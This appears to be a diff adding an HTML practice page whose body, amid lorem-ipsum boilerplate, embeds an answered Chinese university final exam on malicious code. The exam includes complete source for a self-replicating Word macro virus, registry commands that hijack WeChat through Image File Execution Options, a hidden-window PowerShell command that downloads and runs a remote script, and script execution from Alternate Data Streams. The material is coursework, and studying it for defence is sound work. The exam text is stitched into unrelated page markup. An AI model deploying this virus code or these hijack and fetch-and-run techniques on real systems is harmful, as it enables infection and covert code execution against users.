@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Genshin Impact</title>
+</head>
+
+<body>
+    <!-- Heading注释 -->
+    <h1>HeadingOne</h1>
+    <h2>HeadingTwo</h2>
+
+    <p><em>Lorem ipsum, dolor sit amet consectetur adipisicing elit. Cum, at?</em>
+        Lorem ipsum dolor sit amet consectetur adipisicing elit. Ea, tempora!
+    </p>
+    <p><strong>加粗</strong>Lorem ipsum, dolor sit amet consectetur adipisicing elit. Possimus ducimus dignissimos, sapiente nesciunt vel
+        eaque quisquam cum voluptatem aperiam? Qui sint illum repellendus. Dignissimos esse maxime ut id suscipit est.
+    </p>
+    <p>
+        广东技术师范大学
+        2023—2024学年度第( 一 )学期期末考试试卷
+        
+        科 目：恶意代码原理与防范  （A）卷
+        考试形式：开卷（机试）                     考试时间:120 分钟
+        
+        系别、班级：              姓名：              学号：           
+        
+        题   目	一	二	三	四	五	六	七	八	总分
+        标准分数	10	20	40	30					100
+        实得分数									
+        评卷人	
+        
+        
+        
+        注:
+        1.空开和打方框的部分根据实际情况填写：学年时间和学期，是期中或期末，考试或考查，是A卷或B卷；最后要去掉方框；
+        2.页面设置规格：纸张大小设置为19.5cm×27cm，上下左右各空2cm，正文字体字号为宋体小四，英文为五号，页码位置为页面底端、居中；
+        3.装订线只设在第1、5、9页；
+        4.题型大体按考核学生的认识、理解、应用、分析、综合能力为序排列；
+        5.每道题应于题后括弧内标注每小题得分及总分。每道题总分应同时标注于卷头标准分数栏内；
+        6.以“班级+姓名+学号”来重命名试卷，考试结束时提交该试卷文档。
+          
+          
+        一、单项选择题（2分/题，共10分）
+        1．计算机病毒的主要特性不包括（ D    ）。
+        A．破坏性    B．繁殖性    C．不可预见性    D．自动攻击性
+        2．首个诞生于实验室的能利用网络漏洞进行自我复制的Unix程序，被（ A    ）称之为计算机病毒。
+        A．Fred Cohen     B．Bill Gates     C．Steve Jobs     D．Elon Musk
+        3．首个真正在网络信息系统中传播的并造成实际影响的计算机病毒是（ A   ）。
+        A．C-Brain病毒   B．黑色星期五病毒    C．大麻病毒   D．Stone病毒
+        4．计算机病毒是（  D   ）。
+        A．细菌感染                   B．生物病毒感染   
+        C．被破坏的程序               D．能自我复制并感染其他程序的程序
+        5．防病毒软件不能完成的任务是（   D  ）。
+        A．查杀部分计算机病毒             B．狙击部分计算机病毒对信息系统的破坏
+        C．发现并防止部分计算机病毒入侵   D．查收所有计算机病毒
+        二、多项选择题（2分/题，共20分）
+        1．按照其依赖的存储介质，计算机病毒的类型主要包括（ ABCD    ）。
+        A．引导区病毒    B．文件病毒    C．U盘病毒     D．网页病毒
+        2．从实现的功能模块角度，计算机病毒主要包括（  ABCD    ）模块。
+        A．病毒引导      B．病毒传染    C．病毒触发     D．病毒表现
+        3．计算机病毒的生命周期主要包括(     ABCD E      )阶段。
+        A．病毒诞生   B．病毒传播   C．病毒潜伏   D．病毒发作  E．病毒凋亡
+        4．计算机病毒采用的隐匿技术主要包括（ ABCD    ）。
+        A．Rootkit技术    B．无文件攻击    C．进程镂空     D．DLL注入
+        5．宏病毒可感染如下文件类型（ BC   ）。
+        A．EXE文件     B．DOC文件     C．XLS文件     D．TXT文件
+        6．计算机病毒的破坏性主要表现在（   ABCD  ）。
+        A．加密文件     B．删除数据      C．销毁数据     D．窃取数据
+        7．无文件病毒类型主要包括（ A BCD   ）。
+        A．灰色工具型   B．脚本型        C．潜伏型      D．内存型
+        8．常用的计算机病毒检测方法有（   ABCD  ）。
+        A．特征码检测   B．启发式检测    C．虚拟沙箱检测   D．数据驱动检测
+        9．在数据驱动的计算机病毒检测中，目前有影响力的病毒数据集有（  ABC   ）。
+        A．SoReL-20M数据集               B．EMBER数据集
+        C．KMC2015数据集                D．KDD99数据集
+        10．真正意义上进行物理破坏的计算机病毒主要有（   ABCD      ）。
+        A．CIH病毒    B．Stuxnet病毒    C．BlackEnergy病毒    D．WannaCry病毒
+        
+        二、简答题（10分/题，共40分）
+        1.什么是计算机病毒生命周期？主要包含哪些阶段？
+        计算机病毒生命周期是指从病毒编写诞生开始到病毒被猎杀的生命历程，主要包括诞生、传播、潜伏、发作、检测、凋亡等阶段。
+        
+        
+        2. 简述计算机病毒如何利用缓冲区溢出进行自动执行。
+        
+        计算机病毒利用缓冲区溢出进行自动执行的过程如下：
+        
+        发现漏洞：识别目标软件中存在的缓冲区溢出漏洞。
+        构造恶意输入：创建超出预期长度的数据，其中包含恶意代码（如 shellcode）。
+        覆盖返回地址：用恶意数据填满并溢出缓冲区，覆盖函数的返回地址，使其指向恶意代码。
+        控制执行流程：当程序尝试从当前函数返回时，转而执行恶意代码。
+        自动执行恶意代码：恶意代码被执行，可以下载额外的恶意软件、传播病毒或执行其他恶意操作。
+        
+        缓冲区溢出（Buffer Overflow），是为缓冲区提供了多于其存储容量的数据，就像往杯子里倒入过量的水会溢出一样。一般而言，缓冲区溢出的数据能破坏原来程序的数据，会造成意想不到的结果。然而，如果是有意精心构造溢出数据的内容，那么就有可能获得系统的控制权，使系统按照预定的逻辑执行相应代码。
+        在冯·诺依曼系统中，缓冲区可视为一段可读写的内存区域。高级语言中定义的变量、数组、结构体等数据，在运行时都存储于缓冲区内。缓冲区攻击的终极目的就是控制系统去执行缓冲区（可读写内存）中已设计好的计算机病毒。从进程地址空间分布来看，代码段存储着用户程序的所有可执行代码，在程序正常执行的情况下，程序计数器（PC 指针）只会在代码段和操作系统地址空间（内核态）内寻址和取指令。数据段存储着用户程序的全局变量、文字池（Literal Pool）等。栈空间存储着用户程序的函数栈帧（包括参数、局部变量等），用于实现函数调用机制，其数据增长方向是：高地址→低地址。堆空间存储着程序运行时动态申请的内存数据等，其数据增长方向是：低地址→高地址。除代码段和受操作系统保护的数据区域，其他的内存区域都可作为缓冲区。因此，缓冲区溢出的位置可能在数据段、堆空间、栈空间等。如果程序代码有漏洞，计算机病毒能使程序计数器从上述缓冲区内取指令，并执行计算机病毒设定的代码
+        
+        
+        
+        3. 简述宏病毒的传播机制及防御措施。
+        
+        Word 宏病毒是利用 Microsoft Word 的开放性，即 Word 中提供的 Word_Basic语言编程接口，而编写的一个或多个具有病毒特点的宏的集合。此类宏病毒能通过.DOC 文档及.DOT 模板感染 Normal.dot 公共模板，从而完成自我复制及外向传播功能。
+        防御措施：
+        1.禁用宏
+        2.更新和补丁管理
+        3.安全意识培训 
+        4.使用防病毒软件
+        5.启用警告提示
+        6.限制权限
+        7.沙盒环境
+        8.及时更新软件
+        9.使用宏签名
+        
+        
+        防御措施
+        针对宏病毒的防御措施包括但不限于以下几点：
+        1.禁用宏：默认情况下禁用所有来自互联网或其他不可信来源的宏，除非明确信任该来源并确认安全。
+        2.更新和补丁管理：确保操作系统和应用程序始终保持最新状态，安装最新的安全更新和补丁。
+        3.安全意识培训：教育用户识别潜在的社会工程学攻击，不要轻易打开未知来源的文档或启用宏。
+        4.使用防病毒软件：部署可靠的防病毒解决方案，定期扫描系统以检测和清除已知的宏病毒和其他威胁。
+        5.启用警告提示：配置办公软件，当尝试打开包含宏的文档时向用户发出警告，并要求确认是否继续。
+        6.限制权限：对于不需要编辑权限的文档，应以只读模式打开，减少宏病毒感染的风险。
+        7.沙盒环境：在隔离的环境中（如虚拟机或沙箱）打开可疑文件，以防万一宏病毒试图对主机系统造成损害。
+        
+        
+        
+        
+        
+        
+        4. 什么是Rootkit？其主要功能是什么？
+        Rootkit是一种通过修改操作系统内核或更改指令执行路径，来隐藏系统对象(包括文件、进程、驱动、注册表项、开放端口、网络连接等）以逃避或者规避标准系统机制的程序。
+        Rootkit在机器上建立一个远程接口，该接口允许攻击者以一种难以察觉的方式（隐藏）对系统进行操纵（指挥与控制）和收集数据（侦察）。
+        Rootkit 的主要功能：
+        1.隐藏存在
+        2.获取特权访问
+        3.持久性
+        4.远程控制
+        5.辅助其他恶意软件
+        6.干扰安全工具
+        
+        
+        
+        Rootkit的主要功能包括：
+        隐藏进程：Rootkit可以隐藏运行中的恶意进程，使它们在系统监控工具中不可见。
+        隐藏文件和文件夹：它可以隐藏恶意文件，包括病毒、木马和其他恶意软件，使得这些文件在文件浏览器中不可见。
+        隐藏网络连接：Rootkit可以隐藏由恶意软件建立的网络连接，使得攻击者可以秘密地与受感染系统通信。
+        修改系统日志：它能够修改或删除系统日志，以掩盖攻击者的活动痕迹。
+        权限提升：Rootkit可能会尝试提升其权限，以便能够访问和控制系统的更多部分。
+        键盘记录：一些Rootkit还具有键盘记录功能，可以记录用户的键盘输入，包括密码和其他敏感信息。
+        后门创建：Rootkit可能会在系统中创建后门，允许攻击者在任何时候重新获得对系统的访问。
+        防御机制规避：Rootkit可能会采取措施来规避或禁用安全软件，如防病毒程序和防火墙。
+        
+        
+        
+        三、实践操作应用题（10分/题，共30分）
+        要求：需进行完整实验并记录下实验过程与实验结果截图。
+        
+        1.	利用“台湾一号”宏病毒样本，完成宏病毒感染操作及防御宏病毒操作（10分）。
+        
+        Word右上角点开word的设置选项
+        
+        在Visual Basic左侧的工程文件打开Project-Microsoft Word 对象-ThisDocument，在小窗中填入测试病毒代码（要记得修改生效日期）
+        
+        
+        代码如下：
+        'moonlight
+        Dim nm(4)
+        Sub Document_Open()
+        'DisableInput 1
+        
+        Set ourcodemodule = ThisDocument.VBProject.VBComponents(1).CodeModule
+        
+        
+        Set host = NormalTemplate.VBProject.VBComponents(1).CodeModule
+        If ThisDocument = NormalTemplate Then
+            Set host = ActiveDocument.VBProject.VBComponents(1).CodeModule
+        End If
+        With host
+        If .Lines(1, 1) <> "'moonlight" Then
+            
+            .DeleteLines 1, .CountOfLines
+        .InsertLines 1, ourcodemodule.Lines(1, 100)
+        .ReplaceLine 3, "Sub Document_Close()"
+            If ThisDocument = NormalTemplate Then
+                .ReplaceLine 3, "Sub Document_Open()"
+                ActiveDocument.SaveAs ActiveDocument.FullName
+            End If
+            
+        End If
+        
+        End With
+        
+        Count = 0
+        If Day(Now()) = 19 Then
+        try:
+                On Error GoTo try
+                test = -1
+                con = 1
+                tog$ = ""
+                i = 0
+                While test = -1
+                    For i = 0 To 4
+                        nm(i) = Int(Rnd() * 10)
+                        con = con * nm(i)
+                        If i = 4 Then
+                            tog$ = tog$ + Str$(nm(4)) + "=?"
+                            GoTo beg
+                        End If
+                        tog$ = tog$ + Str$(nm(i)) + "*"
+                    Next i
+        beg:
+                Beep
+                ans$ = InputBox$("今天是" + Date$ + ",跟你玩一个心算游戏" + Chr$(13) + "若你答错，只好接受震撼教育......" + Chr$(13) + tog$, "台湾NO.1 Macro Virus")
+                If RTrim$(LTrim$(ans$)) = LTrim$(Str$(con)) Then
+                    Documents.Add
+                    Selection.Paragraphs.Alignment = wdAlignParagraphCenter
+                    Beep
+                    With Selection.Font
+                        .Name = "细明体"
+                        .Size = 16
+                        .Bold = 1
+                        .Underline = 1
+                    End With
+                    Selection.InsertAfter Text:="何谓宏病毒"
+                    Selection.InsertParagraphAfter
+                    Beep
+                    Selection.InsertAfter Text:="答案："
+                    Selection.Font.Italic = 1
+                    Selection.InsertAfter Text:="我就是......"
+                    Selection.InsertParagraphAfter
+                    Selection.InsertParagraphAfter
+                    Selection.Font.Italic = 0
+                    Beep
+                    Selection.InsertAfter Text:="如何预防宏病毒"
+                    Selection.InsertParagraphAfter
+                    Beep
+                    Selection.InsertAfter Text:="答案："
+                    Selection.Font.Italic = 1
+                    Selection.InsertAfter Text:="不要看我......"
+                    GoTo out
+                    Else
+                        Count = Count + 1
+                        For j = 1 To 20
+                            Beep
+                            Documents.Add
+                        Next j
+                    Selection.Paragraphs.Alignment = wdAlignParagraphCenter
+                    Selection.InsertAfter Text:="宏病毒"
+                    If Count = 2 Then GoTo out
+                    GoTo try
+                End If
+        Wend
+        End If
+        out:
+        End Sub
+        以“启用宏的Word文档”保存
+        
+        找到并删除 Autoexec.DOT 文件，步骤操作：
+        
+        打开“文件资源管理器”。
+        在地址栏中输入 %APPDATA%\Microsoft\Templates 然后按回车键。
+        这将带你到Templates文件夹，你应该能看到Normal.dotm文件。
+        
+        
+        2. 利用映像劫持（IFEO）技术，用3种方法实现计算机病毒对微信应用程序的劫持（10分）。
+        
+        注意：根据实际情况修改WeChat.exe 和 C:\Windows\system32\cmd.exe
+        
+        （1）注册表编辑器 手动修改
+        按 Win + R 打开 运行 对话框，输入 regedit，并按回车打开注册表编辑器。
+        定位到以下路径：
+        HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ WeChat.exe如果没有这个路径，可以手动创建：
+        右键点击 Image File Execution Options 文件夹，选择 新建 -> 项，命名为 WeChat.exe。
+        在 WeChat.exe 下，右键选择 新建 -> 字符串值，命名为 Debugger。
+        设置 Debugger 的值为：
+        C:\Windows\system32\cmd.exe
+        
+        
+        （2）命令行 powershell 运行 （注意空格问题）
+        reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WeChat.exe" /v Debugger /t REG_SZ /d "C:\Windows\system32\cmd.exe" /f
+        
+        
+        （3）创建脚本文件 创建 .reg 文件
+        文件内容：
+        Windows Registry Editor Version 5.00
+        
+        [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WeChat.exe]
+        "Debugger"="C:\Windows\system32\cmd.exe"
+        
+        
+        
+        3. 利用CMD和Powershell实现无文件病毒攻击操作（10分）。
+        
+        一、Powershell实现无文件病毒攻击操作
+        （1）脚本文件 test.ps1
+        
+        function Read-MessageBoxDialog {
+            $PopUpWin = new-object -comobject wscript.shell
+            $PopUpWin.popup("Hello World, Welcome to School of Cybersecurity, GPNU!")
+        }
+        
+        Read-MessageBoxDialog
+        
+        
+        （2）在 PowerShell 会话中临时修改执行策略
+        llp
+        Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
+        
+        （3）在目标目录中（包含test.ps1文件）运行以下命令：
+        python -m http.server 8080 --bind 0.0.0.0
+        
+        
+        （遇到无法访问http服务时可以试试）
+        通过命令行打开防火墙的特定端口（如 8080）：
+        netsh advfirewall firewall add rule name="Allow Python HTTP" dir=in action=allow protocol=TCP localport=8080
+        
+        
+        （4）客户端
+        使用浏览器访问：http://<服务器IP地址>/ test.ps1，确保能够下载test.ps1脚本文件。
+        
+        （5）在客户端执行以下命令：
+        powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonInteractive -Command "& {IEX(New-Object Net.WebClient).DownloadString('http://10.236.0.54:8080/test.ps1')}"
+        
+        注意：IP需要改成服务端的IP
+        
+        
+        二、CMD实现无文件病毒攻击操作
+        先创建一个文本文档gpnu.txt文件并编辑
+        msgbox "Hello World,Welcome to school of cybersecurity,GPNU!",vbOKOnly,"school of cybersecurity"
+         
+        然后将文件后缀改为.vbs
+        双击运行会出现弹窗
+         
+         创建一个宿主文件primary.txt
+        使用type命令创建指定宿主文件的ADS文件。
+        把vbs脚本文件附加到宿主文件primary.txt上，命令如下：
+        type gpnu.vbs>primary.txt:gpnu.vbs 
+        使用wscript.exe即可执行上述附加的vbs脚本文件，执行ADS文件primary.txt:gpnu.vbs命令如下：
+        wscript primary.txt:gpnu.vbs
+        
+        
+        nulla?</p>
+        <p><a href="https://ys.mihoyo.com/"
+        target="_blank">Genshin</a>
+        </p>
+        <!-- alt + shift + 下箭头：复制 -->
+        <!-- ctrl + ? : 注释 -->
+        <!-- Lists -->
+        <ul>
+            <li>List Item 1</li>
+            <li>List Item 2</li>
+            <li>List Item 3</li>
+            <li>List Item 4</li>
+            <li>List Item 5</li>
+        </ul>
+        <ol>
+            <li>List Item 1</li>
+            <li>List Item 2</li>
+            <li>List Item 3</li>
+            <li>List Item 4</li>
+            <li>List Item 5</li>
+        </ol>
+        <!-- Table -->
+        <table>
+            <thead>
+                <tr>
+                    <th>Fist Name</th>
+                    <th>Last Name</th>
+                    <th>Age</th>
+                    <th>Email</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>Leonard</td>
+                    <td>Chan</td>
+                    <td>99</td>
+                    <td>abc@.com</td>
+                </tr>
+                <tr>
+                    <td>Leonard</td>
+                    <td>Chan</td>
+                    <td>99</td>
+                    <td>abc@.com</td>
+                </tr>
+                <tr>
+                    <td>Leonard</td>
+                    <td>Chan</td>
+                    <td>99</td>
+                    <td>abc@.com</td>
+                </tr>
+            </tbody>
+        </table>
+        <br>
+        <br>
+        <hr>
+        <br>
+        <!-- Forms -->
+        <form action="form.js" method="POST">
+            <div>
+                <label>First Name</label>
+                <input type="text" name="firstname" placeholder="Enter First Name">
+            </div>
+            <div>
+                <label>Last Name</label>
+                <input type="text" name="lastname" placeholder="Enter Last Name">
+            </div>
+            <div>
+                <label>Email</label>
+                <input type="email" name="email" placeholder="Enter Email">
+            </div>
+            <input type="Submit" name="Submit" value="Submit">
+        </form>
+        <br>
+        <!-- Button -->
+        <button>This is a button</button>
+
+        <!-- Image -->
+        <img style="width: 100vw;" src="https://img.zcool.cn/community/01f2885ce29994a8012141687a14d4.jpg@1280w_1l_2o_100sh.jpg" alt="This is a ima tag">
+
+        <!-- Quotation -->
+        <blockquote>Lorem ipsum dolor sit, amet consectetur adipisicing elit. Fugit, dignissimos consequatur expedita doloremque, voluptates est reiciendis dolore veniam labore adipisci odio aspernatur consectetur mollitia, quae hic. Odit illo provident consequuntur perferendis aliquid ipsa aspernatur id esse dignissimos tempora quibusdam sit sunt, maiores nesciunt rem. Quis fugiat sint architecto quas nihil.</blockquote>
+        <p><abbr title="Massachusetts Institute of Technology">MIT</abbr>is a prestigious collage</p>
+        <p><cite>MIT ia a prestigious collage</cite> by DasAuto</p>
+
+        <div style="margin-top: 500px;"></div>
+
+</body>
+
+</html>
